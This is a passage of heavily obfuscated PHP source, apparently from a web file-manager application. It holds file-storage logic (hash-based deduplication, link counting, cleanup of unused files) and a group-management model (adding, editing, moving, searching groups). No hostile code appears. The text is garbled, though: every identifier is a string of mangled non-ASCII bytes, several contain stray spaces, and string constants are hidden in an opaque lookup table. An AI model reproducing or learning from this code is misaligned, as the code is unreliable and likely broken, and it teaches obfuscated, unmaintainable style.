$ªÒØ˜øú, $¢Èù”¢[1809] => $ıûÑÑàè[$¢Èù”¢[171]] ? $ıûÑÑàè[$¢Èù”¢[171]] : IO::hashSimple($ªÒØ˜øú), $¢Èù”¢[1810] => $ôÈŸëè› ? $ôÈŸëè› : $ŠÉå´ìÉ); if ($™ª²´Ôã = $this->addFileCheckExist($˜®»š˜[$¢Èù”¢[171]], $˜®»š˜[$¢Èù”¢[170]], $˜®»š˜[$¢Èù”¢[78]])) { return $™ª²´Ôã; } return $this->addFileData($˜®»š˜); } private function addFileData($Œã§ƒâà) { $õ’ì•‚ü =& $_SERVER[Ù×¯Ø…]; if (!$Œã§ƒâà) { return !1; } $Œã§ƒâà[$õ’ì•‚ü[78]] = intval($Œã§ƒâà[$õ’ì•‚ü[78]]); if (!$Œã§ƒâà[$õ’ì•‚ü[78]] && strlen($Œã§ƒâà[$õ’ì•‚ü[171]]) > 32) { $Œã§ƒâà[$õ’ì•‚ü[78]] = intval(substr($Œã§ƒâà[$õ’ì•‚ü[171]], 32)); } $Ê˜…ôîÙ = $this->add($Œã§ƒâà); return $this->find($Ê˜…ôîÙ); } public function addFile($²áÌ¶Õ˜, $®Â×Ÿ…², $ı£ÒÜ©… = false) { $˜É‹ÆçÀ =& $_SERVER[Ù×¯Ø…]; $‹ºÌ³É’ = IO::hashSimple($²áÌ¶Õ˜); $éÄƒşñ¡ = IO::size($²áÌ¶Õ˜); $¥ĞáññÑ = $éÄƒşñ¡ <= 1024 * 1024 * 10 ? IO::hashMd5($²áÌ¶Õ˜) : $˜É‹ÆçÀ[33]; $Â¢£º”û = $˜É‹ÆçÀ[1811] . $‹ºÌ³É’; CacheLock::lock($Â¢£º”û); if ($¥ĞáññÑ && $‹ºÌ³É’) { $Äæ¿ıÙ› = $this->addFileCheckExist($‹ºÌ³É’, $¥ĞáññÑ, $éÄƒşñ¡); if ($Äæ¿ıÙ›) { CacheLock::unlock($Â¢£º”û); return $Äæ¿ıÙ›; } } $é¹ÅÀä½ = $this->addFileMake($²áÌ¶Õ˜, $éÄƒşñ¡, $‹ºÌ³É’, $¥ĞáññÑ, $®Â×Ÿ…², $ı£ÒÜ©…); $Âîà£ó = $this->addFileData($é¹ÅÀä½); CacheLock::unlock($Â¢£º”û); if (!$¥ĞáññÑ && $Âîà£ó) { $this->fileMd5Check($Âîà£ó); } return $Âîà£ó; } private function fileMd5Check($áßÍÖñË) { $¡§·Ì×— =& $_SERVER[Ù×¯Ø…]; $ÕâåÌ = array($áßÍÖñË[$¡§·Ì×—[470]], $áßÍÖñË[$¡§·Ì×—[76]]); $ÅÏÒœõÅ = $¡§·Ì×—[1812] . $áßÍÖñË[$¡§·Ì×—[76]]; $ö€·ù”Ï = $¡§·Ì×—[1813] . $áßÍÖñË[$¡§·Ì×—[470]]; $Ù‡†´¨ = TaskQueue::add($¡§·Ì×—[1814], $ÕâåÌ, $ÅÏÒœõÅ, $ö€·ù”Ï); if (!$Ù‡†´¨) { $this->fileMd5Set($áßÍÖñË[$¡§·Ì×—[470]], $áßÍÖñË[$¡§·Ì×—[76]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($Ï‹ÉóÇœ, $ÏŒÏ†î¸) { $âï‹Ó… =& $_SERVER[Ù×¯Ø…]; $˜…‹‘ğÍ = $this->find($Ï‹ÉóÇœ); if (!$˜…‹‘ğÍ || $˜…‹‘ğÍ[$âï‹Ó…[170]]) { return; } $™ªæ³Óí = IO::hashMd5($ÏŒÏ†î¸); if (!$™ªæ³Óí) { return $âï‹Ó…[33]; } $this->where(array($âï‹Ó…[470] => $Ï‹ÉóÇœ))->save(array($âï‹Ó…[170] => $™ªæ³Óí)); } public function addFileMake($á…İõÃ, $„µ•›À±, $‘åÁ •å, $œ‡¯‰ş–, $ş–Â€±­, $‹¯­ÍÍ) { $ùÖóİì =& $_SERVER[Ù×¯Ø…]; $„Ñ¯¹ò = $this->createFileName($ş–Â€±­, $‘åÁ •å, $œ‡¯‰ş–); $ä†ÉÈÚ = get_path_father($„Ñ¯¹ò); $ÁıÛ’­¥ = get_path_this($„Ñ¯¹ò); if ($‹¯­ÍÍ) { $ Â×Ë®„ = IO::move($á…İõÃ, $ä†ÉÈÚ, !1, $ÁıÛ’­¥); } else { $ Â×Ë®„ = IO::copy($á…İõÃ, $ä†ÉÈÚ, !1, $ÁıÛ’­¥); } if (!$ Â×Ë®„) { return !1; } $×¬¨Ç¡ = KodIO::defaultDriver(); $ìİÉ†‡“ = array($ùÖóİì[582] => $„µ•›À±, $ùÖóİì[1808] => 1, $ùÖóİì[424] => $ş–Â€±­, $ùÖóİì[814] => $×¬¨Ç¡[$ùÖóİì[395]], $ùÖóİì[425] => $„Ñ¯¹ò, $ùÖóİì[1809] => $‘åÁ •å, $ùÖóİì[1810] => $œ‡¯‰ş–); return $ìİÉ†‡“; } public function addFileCheckExist($îÕ´ä÷÷, $÷¿É•÷ğ, $öû“§‡¬) { $Ñó‘± =& $_SERVER[Ù×¯Ø…]; $¥•Ñ’ó = $this->findByHash($îÕ´ä÷÷, $÷¿É•÷ğ); if (!$¥•Ñ’ó) { return !1; } $•Äéæó» = array($Ñó‘±[1808] => intval($¥•Ñ’ó[$Ñó‘±[1815]]) + 1, $Ñó‘±[582] => $öû“§‡¬); $this->where(array($Ñó‘±[471] => $¥•Ñ’ó[$Ñó‘±[470]]))->save($•Äéæó»); return $¥•Ñ’ó; } public function remove($ÑçšÓ°Ï) { $this->linkCountChange($ÑçšÓ°Ï, !1); $this->clearEmpty(); return !0; } public function linkAdd($¸Ä±¿ù) { $this->linkCountChange($¸Ä±¿ù, !0); } public function linkCountChange($±îÚÇÈ, $¾°ËÁ¾²) { $Òá¯øŞ  =& $_SERVER[Ù×¯Ø…]; if (!$±îÚÇÈ) { return; } if (!is_array($±îÚÇÈ)) { $±îÚÇÈ = array($±îÚÇÈ); } $ËÒè„„å = array(); foreach ($±îÚÇÈ as $îºşì‡‘) { $ûı”‰¢Å = $îºşì‡‘ . $Òá¯øŞ [33]; if (!$ËÒè„„å[$ûı”‰¢Å]) { $ËÒè„„å[$ûı”‰¢Å] = 0; } $ËÒè„„å[$ûı”‰¢Å]++; } $¤é ì´Š = array(); foreach ($ËÒè„„å as $îºşì‡‘ => $¯òÅ¨º») { $ûı”‰¢Å = $¯òÅ¨º» . $Òá¯øŞ [33]; if (!$¤é ì´Š[$ûı”‰¢Å]) { $¤é ì´Š[$ûı”‰¢Å] = array(); } $¤é ì´Š[$ûı”‰¢Å][] = $îºşì‡‘; } foreach ($¤é ì´Š as $¯òÅ¨º» => $ÄŒ«ıü£) { if (!$ÄŒ«ıü£) { continue; } $¯òÅ¨º» = $¾°ËÁ¾² ? $¯òÅ¨º» : -intval($¯òÅ¨º»); $”‰åˆ–œ = array($Òá¯øŞ [470] => array($Òá¯øŞ [7], $ÄŒ«ıü£)); if ($¯òÅ¨º» < 0) { $”‰åˆ–œ[$Òá¯øŞ [1815]] = array($Òá¯øŞ [1011], abs($¯òÅ¨º»)); } $this->where($”‰åˆ–œ)->setAdd($Òá¯øŞ [1815], $¯òÅ¨º»); } } public function findByHash($ı‘ÖéÀ±, $ù»à¶¹ñ = false) { $ßŒÄéó´ =& $_SERVER[Ù×¯Ø…]; if (!$ı‘ÖéÀ± && !$ù»à¶¹ñ) { return !1; } $æ¾‡œƒå = array($ßŒÄéó´[1809] => $ı‘ÖéÀ±); if ($ù»à¶¹ñ) { $æ¾‡œƒå = array($ßŒÄéó´[1810] => $ù»à¶¹ñ); } return $this->order($ßŒÄéó´[1816])->where($æ¾‡œƒå)->find(); } public function clearEmpty($Î“ÊåÏ÷ = 0) { $’³˜İÏ‘ =& $_SERVER[Ù×¯Ø…]; $Ùšì­ë = time() - 3600 * 24 * $Î“ÊåÏ÷; $ÓÚ®ÕÃ‰ = $’³˜İÏ‘[1817] . $Ùšì­ë; $û´üÏ¢½ = $this->where($ÓÚ®ÕÃ‰)->select(); if (!$û´üÏ¢½) { return; } $ØôúËÜâ = new Task($’³˜İÏ‘[1818], $’³˜İÏ‘[33], count($û´üÏ¢½)); foreach ($û´üÏ¢½ as $ì¿®¥ˆ÷) { $ØôúËÜâ->update(1); $this->resetFile($ì¿®¥ˆ÷); } $ØôúËÜâ->end(); } public function resetFile($’¯Ã‹ƒú) { $…Œõ½ŸÕ =& $_SERVER[Ù×¯Ø…]; $™«§è = array($…Œõ½ŸÕ[471] => $’¯Ã‹ƒú[$…Œõ½ŸÕ[470]]); $«„÷¥…” = Model($…Œõ½ŸÕ[1253])->where($™«§è)->count(); $Ô¾ğ½ö = Model($…Œõ½ŸÕ[1819])->where($™«§è)->count(); $ÂÌ¶Ëß = intval($«„÷¥…”) + intval($Ô¾ğ½ö); if ($ÂÌ¶Ëß == 0) { IO::remove($’¯Ã‹ƒú[$…Œõ½ŸÕ[76]]); Model($…Œõ½ŸÕ[1820])->delete($’¯Ã‹ƒú[$…Œõ½ŸÕ[470]]); $this->where($™«§è)->delete(); $this->metaSet($’¯Ã‹ƒú[$…Œõ½ŸÕ[470]], null, null); return; } if ($’¯Ã‹ƒú[$…Œõ½ŸÕ[1815]] != $ÂÌ¶Ëß) { $this->where($™«§è)->save(array($…Œõ½ŸÕ[1808] => $ÂÌ¶Ëß)); } } public function storageInfo($šÂŒç¡ª = false) { $ËöóàŸÌ =& $_SERVER[Ù×¯Ø…]; $é›Å¢›İ = $this->count() + 0.0; $œô”Â– = 0; $ºô­µ­ = 1; $ì†öª’› = 0; $û½ü•ì‹ = 5000; for ($Â¿ ä¿† = 0; $Â¿ ä¿† < $é›Å¢›İ; $Â¿ ä¿† = $Â¿ ä¿† + $û½ü•ì‹) { $¶²¨ÀâÒ = $this->limit($Â¿ ä¿†, $Â¿ ä¿† + $û½ü•ì‹)->select(); foreach ($¶²¨ÀâÒ as $½ïÉ½œ¡) { $ºô­µ­ += $½ïÉ½œ¡[$ËöóàŸÌ[78]] * $½ïÉ½œ¡[$ËöóàŸÌ[1815]]; $œô”Â– += $½ïÉ½œ¡[$ËöóàŸÌ[78]] * ($½ïÉ½œ¡[$ËöóàŸÌ[1815]] - 1); $ì†öª’› += $½ïÉ½œ¡[$ËöóàŸÌ[1815]]; } } $†¬Ãêº = array($ËöóàŸÌ[1821] => $ºô­µ­, $ËöóàŸÌ[1822] => $œô”Â–, $ËöóàŸÌ[1823] => $œô”Â– / $ºô­µ­, $ËöóàŸÌ[82] => $é›Å¢›İ, $ËöóàŸÌ[1824] => $ì†öª’›); return $†¬Ãêº; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\160"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\155\x65" => "\x67\x72\157\x75\x70\137\155\145\164\141", "\x6d\x65\x74\x61\x46\151\145\x6c\144" => "\x67\x72\157\x75\160\111\x44"); protected function cacheFunctionAlias($›€¯ÉÎ) { $µ¦Îà®» =& $_SERVER[Ù×¯Ø…]; return array($µ¦Îà®»[1825] => array($›€¯ÉÎ[0], $µ¦Îà®»[1826]), $µ¦Îà®»[1827] => array($›€¯ÉÎ[0], $µ¦Îà®»[1828])); } protected function getInfo($€æˆ®úø, $®×Õ“¢  = false) { $´Œ”ˆá = $this->getInfoSimple($€æˆ®úø); if (!$´Œ”ˆá) { return !1; } if ($®×Õ“¢ ) { return $this->_listDataApplyItem($´Œ”ˆá); } return $this->cacheFunctionGet($_SERVER[Ù×¯Ø…][1829], $€æˆ®úø); } protected function getInfoSimple($·û‚ì, $€ª‚¼Ï = false) { $ÆŸÂµ½¦ =& $_SERVER[Ù×¯Ø…]; if ($€ª‚¼Ï) { $¦’ĞÊ› = array($ÆŸÂµ½¦[1748] => intval($·û‚ì)); $¥ƒÍ„¢¸ = $this->where($¦’ĞÊ›)->find(); return is_array($¥ƒÍ„¢¸) ? $¥ƒÍ„¢¸ : array(); } return $this->cacheFunctionGet($ÆŸÂµ½¦[1830], $·û‚ì); } protected function groupAdd($”Ìµ¡) { $¤†ëÂ† =& $_SERVER[Ù×¯Ø…]; if (!$”Ìµ¡[$¤†ëÂ†[501]] && isset($”Ìµ¡[$¤†ëÂ†[1748]]) && $”Ìµ¡[$¤†ëÂ†[1748]] == 1) { if ($¢—ÏÔ·Ê = $this->getInfoSimple($”Ìµ¡[$¤†ëÂ†[1748]], !0)) { return $”Ìµ¡[$¤†ëÂ†[1748]]; } } else { $¢—ÏÔ·Ê = $this->getInfoSimple($”Ìµ¡[$¤†ëÂ†[501]]); if (!$¢—ÏÔ·Ê) { return !1; } } $ùå‚”ş¦ = $¤†ëÂ†[534]; if ($¢—ÏÔ·Ê[$¤†ëÂ†[524]]) { $ùå‚”ş¦ = $¢—ÏÔ·Ê[$¤†ëÂ†[524]] . $¢—ÏÔ·Ê[$¤†ëÂ†[1748]] . $¤†ëÂ†[47]; } $Šõëşíë = array($¤†ëÂ†[424] => $this->groupNameAuto($”Ìµ¡[$¤†ëÂ†[501]], $”Ìµ¡[$¤†ëÂ†[28]]), $¤†ëÂ†[405] => $”Ìµ¡[$¤†ëÂ†[501]], $¤†ëÂ†[587] => $ùå‚”ş¦, $¤†ëÂ†[1831] => $”Ìµ¡[$¤†ëÂ†[1734]], $¤†ëÂ†[1832] => 0, $¤†ëÂ†[1752] => 0); if (isset($”Ìµ¡[$¤†ëÂ†[1771]])) { $Šõëşíë[$¤†ëÂ†[1771]] = $”Ìµ¡[$¤†ëÂ†[1771]]; } else { $È ËĞë˜ = $this->max($¤†ëÂ†[1771]); if (!$È ËĞë˜) { $È ËĞë˜ = 0; } $Šõëşíë[$¤†ëÂ†[1771]] = $È ËĞë˜ + 1; } if (!empty($”Ìµ¡[$¤†ëÂ†[1748]])) { $Šõëşíë[$¤†ëÂ†[1748]] = $”Ìµ¡[$¤†ëÂ†[1748]]; } $¿ã« ù = $this->add($Šõëşíë); $this->setNamePinyin($¿ã« ù, $Šõëşíë[$¤†ëÂ†[28]]); if (isset($”Ìµ¡[$¤†ëÂ†[1833]])) { $this->metaSet($¿ã« ù, array($¤†ëÂ†[1833] => $”Ìµ¡[$¤†ëÂ†[1833]], $¤†ëÂ†[1834] => $”Ìµ¡[$¤†ëÂ†[1834]])); unset($”Ìµ¡[$¤†ëÂ†[1833]]); unset($”Ìµ¡[$¤†ëÂ†[1834]]); } Model($¤†ëÂ†[1253])->groupRootAdd($¿ã« ù); return $¿ã« ù; } protected function groupEdit($öŠˆĞÊ°, $ôÓç¥™ˆ) { $Áœˆíø =& $_SERVER[Ù×¯Ø…]; $İÖÊµÇÑ = $this->getInfoSimple($öŠˆĞÊ°); if (!$İÖÊµÇÑ) { return !1; } if (!empty($ôÓç¥™ˆ[$Áœˆíø[501]])) { $©‡À¡šÂ = $this->getInfoSimple($ôÓç¥™ˆ[$Áœˆíø[501]]); if (!$©‡À¡šÂ) { return !1; } if ($İÖÊµÇÑ[$Áœˆíø[1748]] == $©‡À¡šÂ[$Áœˆíø[1748]]) { return !1; } if ($ôÓç¥™ˆ[$Áœˆíø[501]] != $İÖÊµÇÑ[$Áœˆíø[501]]) { if ($©‡À¡šÂ[$Áœˆíø[524]] !== $İÖÊµÇÑ[$Áœˆíø[524]] && strpos($©‡À¡šÂ[$Áœˆíø[524]], $İÖÊµÇÑ[$Áœˆíø[524]] . $İÖÊµÇÑ[$Áœˆíø[1748]] . $Áœˆíø[47]) === 0) { return !1; } $ôÓç¥™ˆ[$Áœˆíø[587]] = $©‡À¡šÂ[$Áœˆíø[524]] . $ôÓç¥™ˆ[$Áœˆíø[501]] . $Áœˆíø[47]; $this->_changeChildLevel($İÖÊµÇÑ, $©‡À¡šÂ); } } if (isset($ôÓç¥™ˆ[$Áœˆíø[28]])) { $this->setNamePinyin($öŠˆĞÊ°, $ôÓç¥™ˆ[$Áœˆíø[28]]); } if (isset($ôÓç¥™ˆ[$Áœˆíø[1833]])) { $this->metaSet($öŠˆĞÊ°, array($Áœˆíø[1833] => $ôÓç¥™ˆ[$Áœˆíø[1833]], $Áœˆíø[1834] => $ôÓç¥™ˆ[$Áœˆíø[1834]])); unset($ôÓç¥™ˆ[$Áœˆíø[1833]]); unset($ôÓç¥™ˆ[$Áœˆíø[1834]]); } $this->_clearChildrenCache($İÖÊµÇÑ); return $this->where(array($Áœˆíø[1835] => $öŠˆĞÊ°))->save($ôÓç¥™ˆ); } private function _clearChildrenCache($×òÎ³¼) { $‡Ïõºö =& $_SERVER[Ù×¯Ø…]; $­¦­ûˆ = array($‡Ïõºö[587] => array($‡Ïõºö[547], $×òÎ³¼[$‡Ïõºö[524]] . $×òÎ³¼[$‡Ïõºö[1748]] . $‡Ïõºö[548])); $Á£ğÒìƒ = $this->field($‡Ïõºö[1748])->where($­¦­ûˆ)->select(); foreach ($Á£ğÒìƒ as $üË´½À¿) { $this->_clearCache($üË´½À¿[$‡Ïõºö[1748]]); } } private function _clearCache($«¹¶ªÎº) { $Ê–”ØúÇ =& $_SERVER[Ù×¯Ø…]; $this->cacheFunctionClear($Ê–”ØúÇ[1829], $«¹¶ªÎº); $this->cacheFunctionClear($Ê–”ØúÇ[1830], $«¹¶ªÎº); } private function _changeChildLevel($¤ÕÌ»±¥, $í¤óìÂ , $Ú ´°ùå = false) { $­µ¹ô‰® =& $_SERVER[Ù×¯Ø…]; $Ÿš­ÓóÅ = $¤ÕÌ»±¥[$­µ¹ô‰®[524]] . $¤ÕÌ»±¥[$­µ¹ô‰®[1748]] . $­µ¹ô‰®[47]; $ûÆ¬‰·’ = $í¤óìÂ [$­µ¹ô‰®[524]] . $í¤óìÂ [$­µ¹ô‰®[1748]] . $­µ¹ô‰®[47] . $¤ÕÌ»±¥[$­µ¹ô‰®[1748]] . $­µ¹ô‰®[47]; if ($Ú ´°ùå) { $ûÆ¬‰·’ = $í¤óìÂ [$­µ¹ô‰®[524]] . $í¤óìÂ [$­µ¹ô‰®[1748]] . $­µ¹ô‰®[47]; } $ó¨È§¥ğ = array($­µ¹ô‰®[587] => array($­µ¹ô‰®[547], $¤ÕÌ»±¥[$­µ¹ô‰®[524]] . $¤ÕÌ»±¥[$­µ¹ô‰®[1748]] . $­µ¹ô‰®[548])); $É”é§®í = array($­µ¹ô‰®[587] => array($­µ¹ô‰®[596], "\x72\145\x70\154\141\x63\145\50\160\x61\162\145\x6e\x74\114\x65\x76\x65\x6c\x2c\47{$Ÿš­ÓóÅ}\47\54\47{$ûÆ¬‰·’}\47\x29")); $this->_clearChildrenCache($¤ÕÌ»±¥); $this->where($ó¨È§¥ğ)->data($É”é§®í)->save(); } public function setNamePinyin($äşÒÔáá, $œçñŸœ‡ = false) { $ÃÒ²íÁÒ =& $_SERVER[Ù×¯Ø…]; if (!$œçñŸœ‡) { $ˆ¶Ú—éø = $this->getInfoSimple($äşÒÔáá); $œçñŸœ‡ = $ˆ¶Ú—éø[$ÃÒ²íÁÒ[28]]; } if (!Input::check($œçñŸœ‡, $ÃÒ²íÁÒ[590])) { $this->metaSet($äşÒÔáá, $ÃÒ²íÁÒ[467], null); $this->metaSet($äşÒÔáá, $ÃÒ²íÁÒ[466], null); return; } $¼˜”ï‹ñ = array($ÃÒ²íÁÒ[467] => str_replace($ÃÒ²íÁÒ[50], $ÃÒ²íÁÒ[33], Pinyin::get($œçñŸœ‡)), $ÃÒ²íÁÒ[466] => Pinyin::get($œçñŸœ‡, $ÃÒ²íÁÒ[591])); $this->metaSet($äşÒÔáá, $¼˜”ï‹ñ); } protected function groupStatus($Ï½âù¯“, $»Ö±ı¡) { $›ÀçÉúÍ =& $_SERVER[Ù×¯Ø…]; $È ¸ìÆá = $this->getInfoSimple($Ï½âù¯“); if (!$È ¸ìÆá) { return !1; } if ($»Ö±ı¡ == $›ÀçÉúÍ[87]) { $™ë½§Ë‘ = $this->parentLevelArray($È ¸ìÆá[$›ÀçÉúÍ[524]]); } else { $á­ìËå¨ = array($›ÀçÉúÍ[587] => array($›ÀçÉúÍ[547], $È ¸ìÆá[$›ÀçÉúÍ[524]] . $È ¸ìÆá[$›ÀçÉúÍ[1748]] . $›ÀçÉúÍ[548])); $™ë½§Ë‘ = $this->where($á­ìËå¨)->field($›ÀçÉúÍ[1748])->select(); $™ë½§Ë‘ = array_to_keyvalue($™ë½§Ë‘, $›ÀçÉúÍ[33], $›ÀçÉúÍ[1748]); } $™ë½§Ë‘[] = $È ¸ìÆá[$›ÀçÉúÍ[1748]]; $À°©š¿ë = array(); foreach ($™ë½§Ë‘ as $Ï½âù¯“) { $À°©š¿ë[] = array($›ÀçÉúÍ[1748] => $Ï½âù¯“, $›ÀçÉúÍ[93] => $›ÀçÉúÍ[749], $›ÀçÉúÍ[372] => $»Ö±ı¡); $this->_clearCache($Ï½âù¯“); } return Model($›ÀçÉúÍ[1836])->addAll($À°©š¿ë, array(), !0); } protected function groupRemove($ŸìÂØ¬Å) { $Æùãî† =& $_SERVER[Ù×¯Ø…]; $î Ö¶î¯ = array($Æùãî†[1748] => $ŸìÂØ¬Å); $Çé—ş‘ = $this->where($î Ö¶î¯)->find(); if (!$Çé—ş‘ || $Çé—ş‘[$Æùãî†[501]] == 0) { return !1; } $Óšºàù¦ = $this->getInfoSimple($Çé—ş‘[$Æùãî†[501]]); $this->_changeChildLevel($Çé—ş‘, $Óšºàù¦, !0); $this->where(array($Æùãî†[501] => $ŸìÂØ¬Å))->save(array($Æùãî†[501] => $Çé—ş‘[$Æùãî†[501]])); Model($Æùãî†[1836])->where($î Ö¶î¯)->delete(); Model($Æùãî†[1837])->where($î Ö¶î¯)->delete(); Model($Æùãî†[831])->groupRootRemove($ŸìÂØ¬Å); return $this->where($î Ö¶î¯)->delete(); } protected function groupSort($Âñ¥“ëˆ) { $´´ğÃÌ =& $_SERVER[Ù×¯Ø…]; $•ëªĞàÊ = array(); foreach ($Âñ¥“ëˆ as $©ë¨ ÕÜ => $’À±îÎ) { $•ëªĞàÊ[] = array($´´ğÃÌ[1748], $’À±îÎ, $´´ğÃÌ[1771], $©ë¨ ÕÜ + 1); } $this->saveAll($•ëªĞàÊ); } public function listData() { $¤˜Ùó˜‡ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¤˜Ùó˜‡[$_SERVER[Ù×¯Ø…][367]]); return $¤˜Ùó˜‡; } private function _makeOrder($ŠìöåÛ = '') { $§ÏØ› =& $_SERVER[Ù×¯Ø…]; $×ï¼ĞÍ = array($§ÏØ›[1748], $§ÏØ›[28], $§ÏØ›[1736], $§ÏØ›[194]); $ıÉÏ¾Ä = array($§ÏØ›[451] => $§ÏØ›[452], $§ÏØ›[453] => $§ÏØ›[454]); $¥Ôğ¶¡ú = Input::get($§ÏØ›[458], $§ÏØ›[7], $§ÏØ›[1752], $×ï¼ĞÍ); $ïşµ×éœ = Input::get($§ÏØ›[459], $§ÏØ›[7], $§ÏØ›[1838], array($§ÏØ›[1838], $§ÏØ›[453])); $ïşµ×éœ = $ıÉÏ¾Ä[$ïşµ×éœ]; $ŠìöåÛ = $ŠìöåÛ . "{$¥Ôğ¶¡ú}\x20{$ïşµ×éœ}\54\x20\x67\162\157\165\160\x49\x44\40\141\x73\x63"; return $this->order($ŠìöåÛ); } public function listChild($„Ÿ¶Óí½) { $·ÖØ÷×Š =& $_SERVER[Ù×¯Ø…]; $‚È«³Öß = $this->where(array($·ÖØ÷×Š[501] => $„Ÿ¶Óí½))->_makeOrder()->selectPage(200); $this->_listDataApply($‚È«³Öß[$·ÖØ÷×Š[367]]); return $‚È«³Öß; } public function listByID($ÆåòÆ‰·) { $¤»ìĞ ı =& $_SERVER[Ù×¯Ø…]; if (!$ÆåòÆ‰·) { return array(); } $°š¶¬› = array($¤»ìĞ ı[1748] => array($¤»ìĞ ı[7], $ÆåòÆ‰·)); $áÍÒ–ñ¿ = $this->where($°š¶¬›)->select(); $áÍÒ–ñ¿ = array_sort_keep($áÍÒ–ñ¿, $¤»ìĞ ı[1748], $ÆåòÆ‰·); $this->_listDataApply($áÍÒ–ñ¿); return $áÍÒ–ñ¿; } public function listSearch($ıŸöñÕş) { $àÍ¨¯¹ =& $_SERVER[Ù×¯Ø…]; $ì‹ßİÍ = $ıŸöñÕş[$àÍ¨¯¹[1839]]; $ƒ—ĞÇóë = isset($ıŸöñÕş[$àÍ¨¯¹[1840]]) ? $ıŸöñÕş[$àÍ¨¯¹[1840]] : !1; if (!trim($ì‹ßİÍ)) { return !1; } $ì‹ßİÍ = str_replace($àÍ¨¯¹[1841], $àÍ¨¯¹[1842], $ì‹ßİÍ); $šÙä™ä› = array($àÍ¨¯¹[1748] => array($àÍ¨¯¹[381], "{$ì‹ßİÍ}\x25"), $àÍ¨¯¹[28] => array($àÍ¨¯¹[381], "\x25{$ì‹ßİÍ}\45"), $àÍ¨¯¹[996] => $àÍ¨¯¹[1843]); if ($ƒ—ĞÇóë) { $âÀœ÷áÕ = $this->getInfoSimple($ƒ—ĞÇóë); $ßû¥ø§Â = $âÀœ÷áÕ[$àÍ¨¯¹[524]] . $ƒ—ĞÇóë . $àÍ¨¯¹[548]; $šÙä™ä› = array($šÙä™ä›, array($àÍ¨¯¹[524] => array($àÍ¨¯¹[381], $ßû¥ø§Â))); } $šÙä™ä› = $this->parseWhereLike($šÙä™ä›); $Æ‚ßŞİß = $this->_makeOrder()->where($šÙä™ä›)->selectPage(20); $Æ‚ßŞİß = $Æ‚ßŞİß ? $Æ‚ßŞİß : array($àÍ¨¯¹[367] => array(), $àÍ¨¯¹[364] => array()); if (!$Æ‚ßŞİß || count($Æ‚ßŞİß[$àÍ¨¯¹[367]]) < 5 && Input::check($ì‹ßİÍ, $àÍ¨¯¹[316])) { $Ä²àÏ‘– = $this->groupChildrenAll($ƒ—ĞÇóë); $Çñ¦”æ = $this->_searchFromMeta($àÍ¨¯¹[466], $ì‹ßİÍ, 10, $Ä²àÏ‘–); $ÑÅ“˜Š¶ = $this->_searchFromMeta($àÍ¨¯¹[467], $ì‹ßİÍ, 10, $Ä²àÏ‘–); $áÈà « = array_merge($Çñ¦”æ, $ÑÅ“˜Š¶, $Æ‚ßŞİß[$àÍ¨¯¹[367]]); $Æ‚ßŞİß[$àÍ¨¯¹[367]] = array_unique_by_key($áÈà «, $àÍ¨¯¹[1748]); $Æ‚ßŞİß[$àÍ¨¯¹[364]][$àÍ¨¯¹[365]] = count($Æ‚ßŞİß[$àÍ¨¯¹[367]]); $Æ‚ßŞİß[$àÍ¨¯¹[364]][$àÍ¨¯¹[366]] = ceil($Æ‚ßŞİß[$àÍ¨¯¹[364]][$àÍ¨¯¹[365]] / $Æ‚ßŞİß[$àÍ¨¯¹[364]][$àÍ¨¯¹[361]]); } $this->_listDataApply($Æ‚ßŞİß[$àÍ¨¯¹[367]]); return $Æ‚ßŞİß; } protected function groupChildrenAll($Â©‰œ‡Ã) { $ÜÃî‘Ù¨ =& $_SERVER[Ù×¯Ø…]; if (!$Â©‰œ‡Ã) { return !1; } if (is_string($Â©‰œ‡Ã)) { $Â©‰œ‡Ã = array($Â©‰œ‡Ã); } $Ê§®ŒÆ = $Â©‰œ‡Ã; foreach ($Â©‰œ‡Ã as $Ïñë…£Ş) { $Á¡®êêŠ = $this->getInfoSimple($Ïñë…£Ş); $Éœ¡ªñ = array($ÜÃî‘Ù¨[524] => array($ÜÃî‘Ù¨[381], $Á¡®êêŠ[$ÜÃî‘Ù¨[524]] . $Ïñë…£Ş . $ÜÃî‘Ù¨[548])); $÷¯”­î¨ = $this->field($ÜÃî‘Ù¨[1748])->where($Éœ¡ªñ)->select(); $Ê§®ŒÆ = array_merge($Ê§®ŒÆ, array_to_keyvalue($÷¯”­î¨, $ÜÃî‘Ù¨[33], $ÜÃî‘Ù¨[1748])); } return array_unique($Ê§®ŒÆ); } private function _searchFromMeta($À²ú…¥Ù, $†®Ûö½, $­ªŞ¿„», $¢ëÆˆìï) { $ŸÉİ“ç¬ =& $_SERVER[Ù×¯Ø…]; $†®Ûö½ = strtolower($†®Ûö½); $şˆØ˜‡í = array($ŸÉİ“ç¬[93] => $À²ú…¥Ù, $ŸÉİ“ç¬[372] => array($ŸÉİ“ç¬[381], "\x25{$†®Ûö½}\x25")); $şˆØ˜‡í = $this->parseWhereLike($şˆØ˜‡í); if ($¢ëÆˆìï) { $şˆØ˜‡í[$ŸÉİ“ç¬[1748]] = array($ŸÉİ“ç¬[7], $¢ëÆˆìï); } $è·„÷ è = Model($ŸÉİ“ç¬[1844])->where($şˆØ˜‡í)->limit($­ªŞ¿„»)->select(); if (!$è·„÷ è) { return array(); } $è·„÷ è = array_to_keyvalue($è·„÷ è, $ŸÉİ“ç¬[33], $ŸÉİ“ç¬[1748]); $îé´ç¹‚ = $this->where(array($ŸÉİ“ç¬[1835] => array($ŸÉİ“ç¬[7], $è·„÷ è)))->select(); if (!$îé´ç¹‚) { return array(); } return $îé´ç¹‚; } protected function _listDataApplyItem($À‰ñ²Ç¼) { $„®é¦é = array($À‰ñ²Ç¼); $this->_listDataApply($„®é¦é); return $„®é¦é[0]; } protected function _listDataApply(&$†ˆòµÜ“) { $Ú½ßŸ¸å =& $_SERVER[Ù×¯Ø…]; if (!$†ˆòµÜ“) { return; } $›‹Êƒø = array_to_keyvalue($†ˆòµÜ“, $Ú½ßŸ¸å[33], $Ú½ßŸ¸å[1748]); $this->_listAppendChildren($†ˆòµÜ“); $this->_listAppendChildrenMember($†ˆòµÜ“); $this->_listAppendMeta($†ˆòµÜ“, $›‹Êƒø); $this->_listAppendParent($†ˆòµÜ“); $this->_listAppendSourceRoot($†ˆòµÜ“, $›‹Êƒø); } private function _listAppendChildren(&$ ¼áñÓ…) { $ÃÃ„µ£Õ =& $_SERVER[Ù×¯Ø…]; $Æ¦üÜÅÖ = array_to_keyvalue($ ¼áñÓ…, $ÃÃ„µ£Õ[33], 